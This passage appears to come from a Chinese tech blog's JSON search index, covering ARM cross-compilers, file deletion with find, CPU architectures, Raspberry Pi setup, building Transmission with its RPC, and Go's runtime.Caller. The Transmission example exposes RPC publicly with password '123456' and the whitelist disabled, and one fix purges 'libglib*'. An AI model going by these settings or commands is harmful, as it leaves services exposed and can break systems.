这个专用于嵌入式系统的C库。\n\n#### 2、arm-none-linux-gnueabi-gcc  //常用的\n\n(ARM architecture, no vendor, creates binaries that run on the **Linux** operating system, and uses the GNU EABI)\n\n主要用于基于ARM架构的Linux系统，可用于编译 ARM 架构的 u-boot、Linux内核、linux应用等。arm-none-linux-gnueabi基于GCC，使用Glibc库，经过 `Codesourcery` 公司优化过推出的编译器。arm-none-linux-gnueabi-xxx 交叉编译工具的浮点运算非常优秀。一般ARM9、ARM11、Cortex-A 内核，带有 Linux 操作系统的会用到。\n\n#### 3、arm-eabi-gcc\n\nAndroid ARM 编译器。\n\n#### 4、armcc\n\nARM 公司推出的编译工具，功能和 arm-none-eabi 类似，可以编译裸机程序（u-boot、kernel），但是不能编译 Linux 应用程序。armcc一般和ARM开发工具一起，Keil MDK、ADS、RVDS和DS-5中的编译器都是armcc，所以 armcc 编译器都是收费的（爱国版除外，呵呵~~）。\n\n#### 5、arm-none-uclinuxeabi-gcc 和 arm-none-symbianelf-gcc\n\narm-none-uclinuxeabi 用于**uCLinux**，使用Glibc。\n\narm-none-symbianelf 用于**symbian**，没用过，不知道C库是什么 。\n\n\n\n## ABI 和 EABI\n\n**ABI**：二进制应用程序接口(Application Binary Interface (ABI) for the ARM Architecture)。在计算机中，应用二进制接口描述了应用程序（或者其他类型）和操作系统之间或其他应用程序的低级接口。\n\n**EABI**：嵌入式ABI。嵌入式应用二进制接口指定了文件格式、数据类型、寄存器使用、堆积组织优化和在一个嵌入式软件中的参数的标准约定。开发者使用自己的汇编语言也可以使用 EABI 作为与兼容的编译器生成的汇编语言的接口。\n\n两者主要区别是，ABI是计算机上的，EABI是嵌入式平台上（如ARM，MIPS等）。\n\n\n\n## Codesourcery公司\n\nCodesourcery推出的产品叫Sourcery G++ Lite Edition，其中基于command-line的编译器是免费的，在官网上可以下载，而其中包含的IDE和debug 工具是收费的，当然也有30天试用版本的。\n\n目前CodeSourcery已经由明导国际(Mentor Graphics)收购，所以原本的网站风格已经全部变为 Mentor 样式，但是 Sourcery G++ Lite Edition 同样可以注册后免费下载。\n\nCodesourcery一直是在做ARM目标 GCC 的开发和优化，它的ARM GCC在目前在市场上非常优秀，很多 patch 可能还没被gcc接受，所以还是应该直接用它的。\n\n而且他提供Windows下[mingw交叉编译的]和Linux下的二进制版本，比较方便；如果不是很有时间和兴趣，不建议下载 src 源码包自己编译，很麻烦，Codesourcery给的shell脚本很多时候根本没办法直接用，得自行提取关键的部分手工执行，又费精力又费时间，如果想知道细节，其实不用自己编译一遍，看看他是用什么步骤构建的即可，如果你对交叉编译器感兴趣的话。\n\n\n\n## arm-linux-gnueabi-gcc 和 arm-linux-gnueabihf-gcc\n\n两个交叉编译器分别适用于 armel 和 armhf 两个不同的架构，armel 和 armhf 这两种架构在对待浮点运算采取了不同的策略（有 fpu 的 arm 才能支持这两种浮点运算策略）。\n\n其实这两个交叉编译器只不过是 gcc 的选项 -mfloat-abi 的默认值不同。gcc 的选项 -mfloat-abi 有三种值 **soft、softfp、hard**（其中后两者都要求 arm 里有 fpu 浮点运算单元，soft 与后两者是兼容的，但 softfp 和 hard 两种模式互不兼容）：\n**soft：** 不用fpu进行浮点计算，即使有fpu浮点运算单元也不用，而是使用软件模式。\n**softfp：** armel架构（对应的编译器为 arm-linux-gnueabi-gcc ）采用的默认值，用fpu计算，但是传参数用普通寄存器传，这样中断的时候，只需要保存普通寄存器，中断负荷小，但是参数需要转换成浮点的再计算。\n**hard：** armhf架构（对应的编译器 arm-linux-gnueabihf-gcc ）采用的默认值，用fpu计算，传参数也用fpu中的浮点寄存器传，省去了转换，性能最好，但是中断负荷高。\n\n\n\n把以下测试使用的C文件内容保存成 mfloat.c：\n\n```c\n#include <stdio.h>\nint main(void)\n{\n    double a,b,c;\n    a = 23.543;\n    b = 323.234;\n    c = b/a;\n    printf(“the 13/2 = %f\\n”, c);\n    printf(“hello world !\\n”);\n    return 0;\n}\n```\n\n\n\n**1、使用 arm-linux-gnueabihf-gcc 编译，使用“-v”选项以获取更详细的信息：**\n\\# arm-linux-gnueabihf-gcc -v mfloat.c\nCOLLECT_GCC_OPTIONS=’-v’ ‘-march=armv7-a’ ‘-mfloat-abi=hard’ ‘-mfpu=vfpv3-d16′ ‘-mthumb’\n-mfloat-abi=hard\n\n可看出使用hard硬件浮点模式。\n\n**2、使用 arm-linux-gnueabi-gcc 编译：**\n\\# arm-linux-gnueabi-gcc -v mfloat.c\nCOLLECT_GCC_OPTIONS=’-v’ ‘-march=armv7-a’ ‘-mfloat-abi=softfp’ ‘-mfpu=vfpv3-d16′ ‘-mthumb’\n-mfloat-abi=softfp\n\n可看出使用softfp模式。","tags":["arm"],"categories":["系统"]},{"title":"使用管道删除不规则文件","url":"%2Fp%2Fa7ad4d37.html","content":"\n\n### 1. 使用 xargs rm \n\n```\nls | grep abcd | rm  //错误用法\n```\n\n\n\nrm doesn't accept input from `stdin`. You'll need to do something like\n\n```\nls | grep abcd | xargs rm\n```\n\n但是遇到不规则符号的文件有可能删除不了.\n\n\n\n### 2. 使用 find exec\n\n可以删除不规则符号文件:\n```\nfind . -name \"*td*\" -exec rm -f {} \\;\n```\n\n","tags":["linux"],"categories":["命令"]},{"title":"深入了解CPU架构","url":"%2Fp%2F690c18bd.html","content":"\n\n\n## CPU是什么\n\n中央处理单元（CPU）主要由运算器、控制器、寄存器三部分组成，从字面意思看运算器就是起着运算的作用，控制器就是负责发出CPU每条指令所需要的信息，寄存器就是保存运算或者指令的一些临时文件，这样可以保证更高的速度。  \n\n\n\nCPU有着处理指令、执行操作、控制时间、处理数据四大作用，打个比喻来说，CPU就像我们的大脑，帮我们完成各种各样的生理活动。因此如果没有CPU，那么电脑就是一堆废物，无法工作。移动设备其实很复杂，这些CPU需要执行数以百万计的指示，才能使它向我们期待的方向运行，而CPU的速度和功率效率是至关重要的。速度影响用户体验，而效率影响电池寿命。最完美的移动设备是高性能和低功耗相结合。 \n\n\n\n## CPU的架构\n\n从CPU发明到现在，有非常多种架构，从我们熟悉的X86，ARM，到不太熟悉的MIPS，IA64，它们之间的差距都非常大。但是如果从最基本的逻辑角度来分类的话，它们可以被分为两大类，即所谓的“复杂指令集”与“精简指令集”系统，也就是经常看到的“CISC”与“RISC”。\n\n\n\n Intel和ARM处理器的第一个区别是，前者使用复杂指令集（CISC)，而后者使用精简指令集（RISC）。属于这两种类中的各种架构之间最大的区别，在于它们的设计者考虑问题方式的不同。\n\n\n\n我们可以继续举个例子，比如说我们要命令一个人吃饭，那么我们应该怎么命令呢？我们可以直接对他下达“吃饭”的命令，也可以命令他“先拿勺子，然后舀起一勺饭，然后张嘴，然后送到嘴里，最后咽下去”。从这里可以看到，对于命令别人做事这样一件事情，不同的人有不同的理解，有人认为，如果我首先给接受命令的人以足够的训练，让他掌握各种复杂技能（即在硬件中实现对应的复杂功能），那么以后就可以用非常简单的命令让他去做很复杂的事情——比如只要说一句“吃饭”，他就会吃饭。但是也有人认为这样会让事情变的太复杂，毕竟接受命令的人要做的事情很复杂，如果你这时候想让他吃菜怎么办？难道继续训练他吃菜的方法？我们为什么不可以把事情分为许多非常基本的步骤，这样只需要接受命令的人懂得很少的基本技能，就可以完成同样的工作，无非是下达命令的人稍微累一点——比如现在我要他吃菜，只需要把刚刚吃饭命令里的“舀起一勺饭”改成“舀起一勺菜”，问题就解决了，多么简单。这就是“复杂指令集”和“精简指令集”的逻辑区别。\n\n<!-- more -->\n\n\n\n## CPU常见架构\n\n##### X86\n\n978年6月8日，Intel发布了史诗级的CPU处理器8086，由此X86架构传奇正式拉开帷幕。首次为8086引入X86作为计算机语言的指令集，定义了一些基本使用规则，X86架构使用的是CISC复杂指令集。同时8086处理器的大获成功也直接让Intel成为了CPU巨头.\n\n##### IA64（Intel Architecture 64，英特尔架构64）\n\n哇，IA64听起来好陌生，是的，虽然同出Intel之手。但这可以说是失败品。当年X86过渡到64位指令集时，一个不小心被AMD弯道超车，最后只能联合惠普推出了属于自己的IA64指令集，但这也仅限于服务器上，也是Itanium安腾处理器的来历（现在已经凉了）\n\n至于IA64究竟是RISC还是CISC指令集的延续，这个真的很难说清楚，但单纯以IA64基于HP的EPIC（Explicitly Parallel Instruction Computers，精确并行指令计算机）来看，似乎更偏向于RISC体系。\n\n##### MIPS（Microprocessor without interlockedpipedstages，无内部互锁流水级的微处理器）\n\n在上世纪80年代由美国斯坦福大学Hennessy教授的研究小组研发，它采用精简指令系统计算结构(RISC)来设计芯片。和Intel采用的复杂指令系统计算结构(CISC)相比，RISC具有设计更简单、设计周期更短等优点，并可以应用更多先进的技术，开发更快的下一代处理器。\n\nMIPS是出现最早的商业RISC架构芯片之一，新的架构集成了所有原来MIPS指令集，并增加了许多更强大的功能。MIPS自己只进行CPU的设计，之后把设计方案授权给客户，使得客户能够制造出高性能的CPU。\n\n让MIPS出名的，可能是在2007年，中科院计算机研究所的龙芯处理器获得了MIPS的全部专利、指令集授权，中国开始走上了一MIPS为基础的CPU研发道路。\n\n##### PowerPC\n\nPowerPC是有蓝色巨人IBM联合苹果(早期mac用的就是这个)、摩托罗拉公司研发的一种基于RISC精简指令集的CPU，PowerPC架构最大优点是灵活性非常好，核心数目灵活可变，因此在嵌入式设备上具有很高效益，可以针对服务器市场做超多核，针对掌机做双核，因此它具有优异的性能、较低的能量损耗以及较低的散热量。\n\n##### ARM（Advanced RISC Machine，进阶精简指令集机器）\n\nARM可以说是一个异军突起的CPU架构，采用了RISC精简指令集，而且ARM发展到今天，架构上非常灵活，可以根据面向应用场景不同使用不同设计的内核，因此可以广泛用于嵌入式系统中，同时它高度节能的特性，目前各种移动设备中全都是它的身影。据统计，使用ARM架构的芯片年出货量高达200亿片，随着物联网时代降临，对于低功耗性ARM芯片需求量会发生爆炸性增长。\n\n\n\n## CPU架构问题总结\n\n##### CISC、RISC之争\n\n从上面得知，历史的长河里面，有过许许多多的CPU架构，它们之间的差异性非常大，经过时间、用户的检验，我们平常所接触到CPU架构也就剩X86和ARM两者，按照最核心的不同可以被分为两大类，即“复杂指令集”与“精简指令集”系统，也就是经常看到的“CISC”与“RISC”。\n\n\n\n要了解X86和ARM CPU架构，就得先了解CISC复杂指令集和RISC精简指令集 ，因为它们第一个区别就是X86使用了复杂指令集（CISC），而后者使用精简指令集（RISC）。造成他们使用不同该指令集的原因在于，面向的设备、对象、性能要求是不一样。\n\n手机SoC普遍都是采用ARM提供的核心作为基础，依据自身需求改变SoC的核心架构，而ARM正正是RISC精简指令集的代表人物。CPU巨头Intel、AMD所采用的X86架构已经沿用了数十年，是CISC复杂指令集的典型代表。\n\n\n\n##### 为什么x86不叫x32\n\nx86，x64，看似写法类似，但实际上代表了完全不同的含义。简单来说，x86指的是cpu的架构，x64是cpu位数。笼统的说，前者代表cpu的逻辑结构，后者是cpu运算能力。除了x86架构的cpu外，还有很多不同架构的cpu，其中最有名的就是IA架构，即intel安腾架构。两者之间的系统、软件不能通用。\n\n而x64的全称叫x86-64，也就是说x64是x86架构的64位cpu。\n\n\n\nx86架构中，最早的cpu是16位的，即8086，其前身还有8位的8008和4位的4004，但后两者是另外的架构。后出的80386已经升级到32位。\n\n这样就可以解释开始的问题了。x86是一种架构的命名，代表所有的该架构下的cpu，包括16位，32位，64位，将来也许会有128位。之所以用x86代表32位系统，是一种通俗用法罢了，是不严谨甚至有误的。由于16位cpu早已淘汰不用了，而在64位出来前，32位cpu占据了很长一段时间，所以习惯性的用x86代表32位cpu。而x64是一个简写，告诉大家的是：我是x86架构中的64位cpu。\n\n\n\n如果严谨的按命名规则来看，现在的x86应该叫x86-32，简称x32。以前16位的8086则应该叫x86-16，简称x16。因此，x86不叫x32，只是一种习称，一种误称。\n\nIA架构下的cpu命名则比较严谨，32位就叫IA32，64就叫IA64。\n\n\n\n##### mac上可以玩iphone的app吗\n\nXcode自带的iOS模拟器并不是真正意义上的模拟器,他没有运行arm指令的能力,之所以你可以用它调试你开发的app,是因为调试目标选为模拟器的时候,Xcode生成的代码是x86/x86_64架构用的,具体是x86还是x86_64取决于你选的机型,如果你选iPhone5S之前的机型的模拟器,那就是x86.\n\n\n\n换个说法,就是这个模拟器并没有模拟arm处理器等硬件,只是在x86/x86_64架构上提供了和iOS一样的接口的SDK,其接口的行为也和iOS上几乎一样.之所以说几乎一样,是因为真的有不一样的地方.\n\n\n\n好了,到这里你知道了,这个模拟器其实就是一个app,模拟下iOS的行为,那些跑在里面的app,其实也都是x86/x86_64的, 而app store上上架的那些app, 都不会包含x86/x86_64架构,只支持arm架构,所以无论如何你也没办法在电脑上运行他们.\n\n至于为什么android可以,因为android是开源的,使用的处理器架构也是资料丰富,所以可以开发出来真正的可以虚拟arm处理器以及其它硬件的模拟器,这样就可以在电脑上运行android app了.而iPhone, iTouch, iPad使用的处理器估计目前还没有谁能真正模拟出来, 就算有这种能人, 他也未必有做模拟器的想法,就算有这个想法,那也未必有那个胆量.\n\n\n\n最后说个常识:\n\n在开发iOS app接入第三方sdk的时候, 偶尔会遇到模拟器无法正确link, 但是真机可以的情况.这其实就是因为sdk提供商提供的sdk,根本就没支持x86/x86_64,鄙视\n\n\n\n\n\n\n\n\n\n\n\n\n\n","tags":["cpu"],"categories":["系统"]},{"title":"在树莓派arm上运行golang和c程序","url":"%2Fp%2F21dd607c.html","content":"\n\n## 树莓派基础设置\n\n##### 树莓派修改键盘布局\n\n```\nsudo dpkg-reconfigure keyboard-configuration\n```\n\n选通用的101键PC键盘\n\n在键盘layout选择中，选Other\n\n然后在选项中，选English(US)\n\n再选English(US, alternative international)\n\n一直下一步,最后重启\n\n```\nsudo reboot\n```\n\n\n\n##### 树莓派修改启动进入终端界面\n\n```\n\nsudo raspi-config\n\nboot option ->console\n\n```\n<!-- more -->\n\n\n##### 树莓派开启ssh\n\n```\n\nsudo raspi-config\n\nSelect Interfacing Options\n\nNavigate to and select SSH\n\nChoose Yes\n\nSelect Ok\n\nChoose Finish\n\n\nsudo systemctl enable ssh\n\nsudo systemctl start ssh\n```\n\n\n\n## 编译golang为arm可执行程序\n\n\n\n```\nGOOS=linux GOARCH=arm GOARM=6 go build -v\n```\n\n\n\nGOARM=5: use software floating point; when CPU doesn't have VFP co-processor\n\nGOARM=6: use VFPv1 only; default if cross compiling; usually ARM11 or better cores (VFPv2 or better is also supported)\n\nGOARM=7: use VFPv3; usually Cortex-A cores\n\n\n\n## 编译arm可执行程序\n\n缺少的程序直接使用`包管理`下载即可\n\n##### 解决下载软件包连接不上的问题 connect to mirrors.opencas.cn....\n\n   ```\nsudo vim /etc/apt/sources.list \n   \n替换源为\n   \ndeb http://mirrors.shu.edu.cn/raspbian/raspbian/ stretch main contrib non-free rpi\n   \nsudo apt-get update&& sudo apt-get -y dist-upgrade&&sudo apt-get update \n   ```\n","tags":["树莓派"],"categories":["系统"]},{"title":"transmission编译安装和golang_rpc的调用","url":"%2Fp%2Fbf531b37.html","content":"\n### 1. mac编译transmission\n\n+ 下载项目\n\n```bash\ngit clone https://github.com/transmission/transmission Transmission\ncd Transmission\ngit submodule update --init\nXcode project file (Transmission.xcodeproj) for building in Xcode. \n```\n\n\n\n+ 在 xcode中编译\n\n  下图第一个是编译 mac 的应用程序,  第二个是可以编译 transmission-daemon 程序\n\n![1](transmission/1.png)\n\n<!-- more -->\n\n\n\n### 2. ubuntu 16.04编译transmission\n\n```bash\n$ sudo apt-get install cmake make build-essential automake autoconf libtool pkg-config intltool libcurl4-openssl-dev libglib2.0-dev libevent-dev libminiupnpc-dev libgtk-3-dev libappindicator3-dev gettext libssl-dev\n\n$ git clone https://github.com/transmission/transmission Transmission\n$ cd Transmission\n$ git submodule update --init\n$ mkdir build\n$ cd build\n$ cmake ..\n$ make\n$ sudo make install (make install DESTDIR=a)\n```\n\n安装完成后出现以下命令:\n\n![2](transmission/2.png)\n\n\n\n编译时遇到的问题:\n\n1. CMAKE_MAKE_PROGRAM is not set\n\n```\nsudo apt-get install gettext\nsudo apt-get install make \nsudo apt-get install libssl-dev\n```\n\n2. missing: CURL_LIBRARY CURL_INCLUDE_DIR\n\n```\nsudo apt-get install libcurl4-openssl-dev//ubuntu\nyum install curl-devel//centos\n```\n\n3. autogen.sh: not found\n\n```\nsudo apt-get install autoconf\nsudo apt-get install automake\nsudo apt-get install libtool\n```\n\n4. transmission libevent 变成了event\n\n   把所有的依赖全部装一遍, 安装后删除build. 重新cmake一下\n\n5. undefined reference to `g_log_structured_standard`\n\n   ```bash\n   apt-get remove --purge libglib*\n   apt-get install libglib-2.x-y  # where x and y are whatever the package version says.\n   ```\n\n   \n\n\n\n### 3. transmission 介绍\n\n- transmission-cli： 独立的命令行客户端。\n- transmission-create： 用来建立.torrent种子文件的命令行工具。\n- transmission-daemon： 后台守护程序。\n- transmission-edit： 用来修改.torrent种子文件的announce URL。\n- transmission-remote： 控制daemon的程序。\n- transmission-show：查看.torrent文件的信息。\n\n\n\n1. 配置文件目录里面包含如下一些文件：\n\n- settings.json： 主要的配置文件，设置daemon的各项参数，包括RPC的用户名密码配置。它实际上是一个符号链接，指向的原始文件是/etc/transmission-daemon/settings.json。里面的参数解释可以参考官网的配置说明。\n- torrents/： 用户存放.torrent种子文件的目录,凡是添加到下载任务的种子，都存放在这里。.torrent的命名包含,种子文件本身的名字和种子的SHA1 HASH值。\n- resume/： 该存放了.resume文件，.resume文件包含了一个种子的信息，例如该文件哪些部分被下载了，下载的数据存储的位置等等。\n- blocklists/： 存储被屏蔽的peer的地址。\n- dht.dat： 存储DHT节点信息。\n\n\n\n配置主要是通过修改 `/var/lib/transmission-daemon/info/settings.json` 文件中的参数来实现的。 **注意**：在编辑 transmission 配置文件的时候，需要先关闭 daemon 进程，否则编辑的参数将会被恢复到原来的状态。\n\n\n\n2. RPC参数介绍: \n\n```\n{\n\"download-dir\": \"/down\", #下载目录的绝对路径\n\"incomplete-dir\": \"/down/temp\", #临时文件路径\n\"rpc-authentication-required\": true, #启用验证\n\"rpc-bind-address\": \"0.0.0.0\", #允许任何IP通过RPC协议访问\n\"rpc-enabled\": true, #允许通过RPC访问\n\"rpc-password\": \"123456\", #RPC验证密码（保存并启动后daemon会计算并替换为HASH值以增加安全性）\n\"rpc-port\": 9091, #RPC端口\n\"rpc-username\": \"transmission\", #RPC验证用户名\n\"rpc-whitelist\": \"*\", #RPC访问白名单\n\"rpc-whitelist-enabled\": false, #关闭白名单功能以便公网访问\n}\n```\n\n更多参数说明请见[官方Wiki](https://github.com/transmission/transmission/wiki/Editing-Configuration-Files)\n\n\n\n### 4. mac使用web界面控制transmission daemon\n\n\n\n+ 运行Xcode 编译好的客户端, 设置 Remote\n\n\n\n![2](transmission/3.png)\n\n\n\n\n\n在浏览器中访问`http://localhost:9091/transmission/web` 并输入设置的用户名及密码就可以看到如下界面\n\n![2](transmission/4.png)\n\n+ 运行Xcode编译好的transmission-daemon\n\n \n\n配置文件在 `/Users/liuwei/Library/Application\\ Support/transmission-daemon/settings.json` \n\n设置环境变量后 `export TRANSMISSION_WEB_HOME=/Users/liuwei/workspace/transmission/web`\n\n通过浏览器访问`http://localhost:9091/transmission/web`\n\n\n\n+ 访问外网ip错误\n\nunauthorized ip address403: ForbiddenUnauthorized IP Address.Either disable the IP address whitelist or add your address to it.If you're editing settings.json, see the 'rpc-whitelist' and 'rpc-whitelist-enabled' entries.If you're still using ACLs, use a whitelist instead. See the transmission-daemon manpage for details.\n\n\n\n```\ntransmission/.config/transmission-daemon/settings.json  \n\n\"rpc-whitelist-enabled\": true,  ture改成false。\n```\n\n\n\n### 5. golang通过rpc调用transmission\n\n\n\n+ rpc api\n\nhttps://github.com/transmission/transmission/blob/master/extras/rpc-spec.txt\n\n+ golang lib for Transmission API\n\nhttps://github.com/pyed/transmission","tags":["transmission"],"categories":["BitTorrent"]},{"title":"golang_runtime函数调用信息","url":"%2Fp%2F375281af.html","content":"\n\n函数的调用信息是程序中比较重要运行期信息, 在很多场合都会用到(比如调试或日志)。\n\nGo 语言 `runtime` 包的 `runtime.Caller` / `runtime.Callers` / `runtime.FuncForPC` 等几个函数提供了获取函数调用者信息的方法.\n\n \n\n这几个函数的文档链接:\n\n- <http://golang.org/pkg/runtime/#Caller>\n\n- <http://golang.org/pkg/runtime/#Callers>\n\n- <http://golang.org/pkg/runtime/#FuncForPC>\n\n  \n\n## runtime.Caller的用法(常用)\n\n函数的签名如下:\n\n```\nfunc runtime.Caller(skip int) (pc uintptr, file string, line int, ok bool)\n```\n\n`runtime.Caller` 返回当前 `goroutine` 的栈上的函数调用信息. 主要有当前的`pc` 值和调用的文件和行号等信息. 若无法获得信息, 返回的 `ok` 值为 `false`.\n\n <!-- more -->\n\n其输入参数 `skip` 为要跳过的栈帧数, 若为 `0` 则表示 `runtime.Caller` 的调用者.\n\n*注意:由于历史原因, runtime.Caller 和 runtime.Callers 中的 skip 含义并不相同, 后面会讲到.*\n\n\n\n下面是一个简单的例子, 打印函数调用的栈帧信息:\n\n```\nfunc main() {\n\tfor skip := 0; skip < 3; skip++ {\n\t\tpc, file, line, ok := runtime.Caller(skip)\n\t\tif !ok {\n\t\t\tbreak\n\t\t}\n\t\tfmt.Printf(\"skip = %v, pc = %v, file = %v, line = %v\\n\", skip, pc, file, line)\n\t}\n\t// Output:\n\t// skip = 0, pc = 4198453, file = caller.go, line = 10\n\t// skip = 1, pc = 4280066, file = $(GOROOT)/src/pkg/runtime/proc.c, line = 220\n\t// skip = 2, pc = 4289712, file = $(GOROOT)/src/pkg/runtime/proc.c, line = 1394\n}\n```\n\n\n\n## runtime.Callers的用法\n\n函数的签名如下:\n\n```\nfunc runtime.Callers(skip int, pc []uintptr) int\n```\n\n`runtime.Callers` 函数和 `runtime.Caller` 函数虽然名字相似(多一个后缀`s`), 但是函数的参数/返回值和参数的意义都有很大的差异.\n\n\n\n`runtime.Callers` 把调用它的函数Go程栈上的程序计数器填入切片 `pc` 中. 参数 `skip` 为开始在 pc 中记录之前所要跳过的栈帧数, **若为 0 则表示 runtime.Callers 自身的栈帧, 若为 1 则表示调用者的栈帧**. 该函数返回写入到 `pc` 切片中的项数(受切片的容量限制).\n\n\n\n下面是 `runtime.Callers` 的例子, 用于输出每个栈帧的 `pc` 信息:\n\n```\nfunc main() {\n\tpc := make([]uintptr, 1024)\n\tfor skip := 0; ; skip++ {\n\t\tn := runtime.Callers(skip, pc)\n\t\tif n <= 0 {\n\t\t\tbreak\n\t\t}\n\t\tfmt.Printf(\"skip = %v, pc = %v\\n\", skip, pc[:n])\n\t}\n\t// Output:\n\t// skip = 0, pc = [4304486 4198562 4280114 4289760]\n\t// skip = 1, pc = [4198562 4280114 4289760]\n\t// skip = 2, pc = [4280114 4289760]\n\t// skip = 3, pc = [4289760]\n}\n```\n\n输出新的 `pc` 长度和 `skip` 大小有逆相关性. `skip = 0` 为 `runtime.Callers` 自身的信息.\n\n这个例子比前一个例子多输出了一个栈帧, 就是因为多了一个 `runtime.Callers` 栈帧的信息 (前一个例子是没有 `runtime.Caller` 信息的(*注意:没有 s 后缀*)).\n\n\n\n## runtime.Callers 和 runtime.Caller 的异同\n\n因为前面2个例子为不同的程序, 输出的 `pc` 值并不具备参考性. 现在我们看看在同一个例子的输出结果如何:\n\n \n\n```\nfunc main() {\n\tfor skip := 0; ; skip++ {\n\t\tpc, file, line, ok := runtime.Caller(skip)\n\t\tif !ok {\n\t\t\tbreak\n\t\t}\n\t\tfmt.Printf(\"skip = %v, pc = %v, file = %v, line = %v\\n\", skip, pc, file, line)\n\t}\n\t// Output:\n\t// skip = 0, pc = 4198456, file = caller.go, line = 10\n\t// skip = 1, pc = 4280962, file = $(GOROOT)/src/pkg/runtime/proc.c, line = 220\n\t// skip = 2, pc = 4290608, file = $(GOROOT)/src/pkg/runtime/proc.c, line = 1394\n\tpc := make([]uintptr, 1024)\n\tfor skip := 0; ; skip++ {\n\t\tn := runtime.Callers(skip, pc)\n\t\tif n <= 0 {\n\t\t\tbreak\n\t\t}\n\t\tfmt.Printf(\"skip = %v, pc = %v\\n\", skip, pc[:n])\n\t}\n\t// Output:\n\t// skip = 0, pc = [4305334 4198635 4280962 4290608]\n\t// skip = 1, pc = [4198635 4280962 4290608]\n\t// skip = 2, pc = [4280962 4290608]\n\t// skip = 3, pc = [4290608]\n}\n```\n\n比如输出结果可以发现, `4280962` 和 `4290608` 两个 `pc` 值是相同的. 它们分别对应 `runtime.main` 和 `runtime.goexit` 函数.\n\n\n\n`runtime.Caller` 输出的 `4198456` 和 `runtime.Callers` 输出的 `4198635` 并不相同. 这是因为, 这两个函数的调用位置并不相同, 因此导致了 `pc` 值也不完全相同.\n\n\n\n最后就是 `runtime.Callers` 多输出一个 `4305334` 值, 对应`runtime.Callers`内部的调用位置.\n\n由于Go语言(Go1.2)采用分段堆栈, 因此不同的 `pc` 之间的大小关系并不明显.\n\n\n\n## runtime.FuncForPC 的用途\n\n函数的签名如下:\n\n```\nfunc runtime.FuncForPC(pc uintptr) *runtime.Func\nfunc (f *runtime.Func) FileLine(pc uintptr) (file string, line int)\nfunc (f *runtime.Func) Entry() uintptr\nfunc (f *runtime.Func) Name() string\n```\n\n\n\n其中 `runtime.FuncForPC` 返回包含给定 `pc` 地址的函数, 如果是无效 `pc` 则返回 `nil` .\n\n`runtime.Func.FileLine` 返回与 `pc` 对应的源码文件名和行号. 安装文档的说明, 如果`pc`不在函数帧范围内, 则结果是不确定的.\n\n`runtime.Func.Entry` 对应函数的地址. \n\n`runtime.Func.Name` 返回该函数的名称. \n\n\n\n```\nfunc main() {\n\tfor skip := 0; ; skip++ {\n\t\tpc, _, _, ok := runtime.Caller(skip)\n\t\tif !ok {\n\t\t\tbreak\n\t\t}\n\t\tp := runtime.FuncForPC(pc)\n\t\tfile, line := p.FileLine(0)\n\n\t\tfmt.Printf(\"skip = %v, pc = %v\\n\", skip, pc)\n\t\tfmt.Printf(\"  file = %v, line = %d\\n\", file, line)\n\t\tfmt.Printf(\"  entry = %v\\n\", p.Entry())\n\t\tfmt.Printf(\"  name = %v\\n\", p.Name())\n\t}\n\t// Output:\n\t// skip = 0, pc = 4198456\n\t//   file = caller.go, line = 8\n\t//   entry = 4198400\n\t//   name = main.main\n\t// skip = 1, pc = 4282882\n\t//   file = $(GOROOT)/src/pkg/runtime/proc.c, line = 179\n\t//   entry = 4282576\n\t//   name = runtime.main\n\t// skip = 2, pc = 4292528\n\t//   file = $(GOROOT)/src/pkg/runtime/proc.c, line = 1394\n\t//   entry = 4292528\n\t//   name = runtime.goexit\n\t\n\t\n\tpc := make([]uintptr, 1024)\n\tfor skip := 0; ; skip++ {\n\t\tn := runtime.Callers(skip, pc)\n\t\tif n <= 0 {\n\t\t\tbreak\n\t\t}\n\t\tfmt.Printf(\"skip = %v, pc = %v\\n\", skip, pc[:n])\n\t\tfor j := 0; j < n; j++ {\n\t\t\tp := runtime.FuncForPC(pc[j])\n\t\t\tfile, line := p.FileLine(0)\n\n\t\t\tfmt.Printf(\"  skip = %v, pc = %v\\n\", skip, pc[j])\n\t\t\tfmt.Printf(\"    file = %v, line = %d\\n\", file, line)\n\t\t\tfmt.Printf(\"    entry = %v\\n\", p.Entry())\n\t\t\tfmt.Printf(\"    name = %v\\n\", p.Name())\n\t\t}\n\t\tbreak\n\t}\n\t// Output:\n\t// skip = 0, pc = [4307254 4198586 4282882 4292528]\n\t//   skip = 0, pc = 4307254\n\t//     file = $(GOROOT)/src/pkg/runtime/runtime.c, line = 315\n\t//     entry = 4307168\n\t//     name = runtime.Callers\n\t//   skip = 0, pc = 4198586\n\t//     file = caller.go, line = 8\n\t//     entry = 4198400\n\t//     name = main.main\n\t//   skip = 0, pc = 4282882\n\t//     file = $(GOROOT)/src/pkg/runtime/proc.c, line = 179\n\t//     entry = 4282576\n\t//     name = runtime.main\n\t//   skip = 0, pc = 4292528\n\t//     file = $(GOROOT)/src/pkg/runtime/proc.c, line = 1394\n\t//     entry = 4292528\n\t//     name = runtime.goexit\n}\n```\n\n\n\n根据测试, 如果是无效 `pc` (比如`0`), `runtime.Func.FileLine` 一般会输出当前函数的开始行号. 不过在实践中, 一般会用 `runtime.Caller` 获取文件名和行号信息, `runtime.Func.FileLine` 很少用到.\n\n\n\n## 定制的 CallerName 函数\n\n基于前面的几个函数, 我们可以方便的定制一个 `CallerName` 函数. 函数 `CallerName` 返回调用者的函数名/文件名/行号等用户友好的信息.\n\n\n\n```\nfunc CallerName(skip int) (name, file string, line int, ok bool) {\n\tvar pc uintptr\n\tif pc, file, line, ok = runtime.Caller(skip + 1); !ok {\n\t\treturn\n\t}\n\tname = runtime.FuncForPC(pc).Name()\n\treturn\n}\n```\n\n其中在执行 `runtime.Caller` 调用时, 参数 `skip + 1` 用于抵消 `CallerName` 函数自身的调用.\n\n\n\n```\nfunc main() {\n\tfor skip := 0; ; skip++ {\n\t\tname, file, line, ok := CallerName(skip)\n\t\tif !ok {\n\t\t\tbreak\n\t\t}\n\t\tfmt.Printf(\"skip = %v\\n\", skip)\n\t\tfmt.Printf(\"  file = %v, line = %d\\n\", file, line)\n\t\tfmt.Printf(\"  name = %v\\n\", name)\n\t}\n\t// Output:\n\t// skip = 0\n\t//   file = caller.go, line = 19\n\t//   name = main.main\n\t// skip = 1\n\t//   file = C:/go/go-tip/src/pkg/runtime/proc.c, line = 220\n\t//   name = runtime.main\n\t// skip = 2\n\t//   file = C:/go/go-tip/src/pkg/runtime/proc.c, line = 1394\n\t//   name = runtime.goexit\n}\n```\n\n\n\n## Go 语言中函数的类型\n\n在 Go 语言中, 除了语言定义的普通函数调用外, 还有闭包函数/init函数/全局变量初始化等不同的函数调用类型.\n\n为了便于测试不同类型的函数调用, 我们包装一个 `PrintCallerName` 函数. 该函数用于输出调用者的信息.\n\n```\nfunc PrintCallerName(skip int, comment 